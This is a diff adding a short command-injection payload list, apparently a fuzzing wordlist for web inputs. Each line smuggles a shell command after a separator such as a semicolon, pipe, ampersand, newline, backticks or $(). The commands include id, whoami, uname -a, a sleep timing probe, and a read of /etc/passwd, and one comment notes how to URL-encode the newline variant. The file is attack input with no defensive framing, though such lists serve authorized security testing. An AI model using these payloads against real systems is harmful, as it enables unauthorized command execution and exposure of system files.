@@ -1,0 +1,13 @@
+; id
+| id
+|| id
+& id
+&& id
+\n id          # newline injection (URL-encode as %0a or %0d%0a)
+`id`
+$(id)
+; ls -la
+| cat /etc/passwd
+; whoami
+; uname -a
+; sleep 5
